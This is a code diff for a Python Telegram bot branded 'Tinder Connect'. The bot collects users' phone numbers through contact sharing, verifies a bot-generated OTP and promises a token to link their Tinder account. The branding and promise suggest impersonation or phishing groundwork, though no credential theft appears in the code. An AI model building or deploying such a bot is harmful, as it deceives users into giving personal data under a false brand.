@@ -1,59 +1,92 @@
 from telegram import (
     Update,
-    KeyboardButton,
-    ReplyKeyboardMarkup,
 )
+import random
 
+from telegram import Update
 from telegram.ext import (
     Application,
     CommandHandler,
     ContextTypes,
     MessageHandler,
+    CallbackQueryHandler,
+    ConversationHandler,
     filters,
 )
 
-import random
 from config import BOT_TOKEN
-from database import (
-    create_database,
-    save_user,
-    get_user,
-)
-from helpers import send_card
-from pathlib import Path
 
-BANNER_PATH = Path("assets/banner.png")
+from database import (
+    create_tables,
+    create_user,
+    get_user,
+    verify_user,
+)
+
+# UI
+from ui import (
+    WELCOME_MESSAGE,
+    HELP_MESSAGE,
+    ERROR_MESSAGE,
+    SUCCESS,
+    STEP_ONE,
+)
+# Keyboards
+from keyboards import (
+    main_menu,
+    phone_keyboard,
+    help_menu,
+)
 
 async def start(update, context):
 
     chat_id = update.effective_chat.id
 
-    if BANNER_PATH.exists():
+# ===========================
+# Conversation States
+# ===========================
 
-        with open(BANNER_PATH, "rb") as photo:
-            await context.bot.send_photo(
-                chat_id=chat_id,
-                photo=photo
-            )
+    WAITING_PHONE = 1
+    WAITING_OTP = 2
 
+
+    # Send premium welcome screen
     await update.message.reply_text(
-        """
-━━━━━━━━━━━━━━━━━━
+        WELCOME_MESSAGE,
+        parse_mode="HTML",
+        reply_markup=main_menu()
+    )
+async def button_handler(update, context):
 
-❤️ Tinder Connect
+    query = update.callback_query
 
-✨ Secure Account Verification
+    await query.answer()
 
-Welcome!
 
-Connect your account securely.
 
-━━━━━━━━━━━━━━━━━━
-        """,
-        reply_markup=start_keyboard()
+
+    if query.data == "help":
+
+        await query.edit_message_text(
+            HELP_MESSAGE,
+            parse_mode="HTML",
+            reply_markup=help_menu()
+        )
+    elif query.data == "start_registration":
+
+        await query.message.reply_text(
+        STEP_ONE,
+        parse_mode="HTML",
+        reply_markup=phone_keyboard()
     )
 
+    elif query.data == "main_menu":
 
+        await query.edit_message_text(
+            WELCOME_MESSAGE,
+            parse_mode="HTML",
+            reply_markup=main_menu()
+        )
 async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     contact = update.message.contact
@@ -75,7 +108,7 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
     # Save to database
-    save_user(
+    create_user(
         user.id,
         phone_number,
         str(otp)
@@ -95,6 +128,7 @@ async def receive_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
 
+
 async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     user = update.effective_user
@@ -112,7 +146,7 @@ async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
 
-    phone_number, correct_otp = user_data
+    phone_number, correct_otp, otp_verified = user_data
 
 
     print("--------------------")
@@ -132,25 +166,36 @@ async def verify_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
 
         await update.message.reply_text(
-            "✅ ✅ OTP verified successfully! Thank you for your patience. We are currently processing your request. Once everything is complete, we will provide you with a secure connection token to link this bot with your Tinder account. Please wait while we finish the process."
+            "✅OTP verified successfully! Thank you for your patience. We are currently processing your request. Once everything is complete, we will provide you with a secure connection token to link this bot with your Tinder account. Please wait while we finish the process."
         )
 
 
 def main():
 
-    create_database()
+    create_tables()
 
     app = Application.builder().token(BOT_TOKEN).build()
 
 
+    # /start command
     app.add_handler(
         CommandHandler("start", start)
     )
 
+
+    # Button clicks (NEW)
+    app.add_handler(
+        CallbackQueryHandler(button_handler)
+    )
+
+
+    # Contact sharing
     app.add_handler(
         MessageHandler(filters.CONTACT, receive_contact)
     )
 
+
+    # Text messages
     app.add_handler(
         MessageHandler(
             filters.TEXT & ~filters.COMMAND,
@@ -168,8 +213,3 @@ def main():
 if __name__ == "__main__":
     main()
 
-def main():
-
-    create_database()
-
-    app = Application.builder().token(BOT_TOKEN).build()    
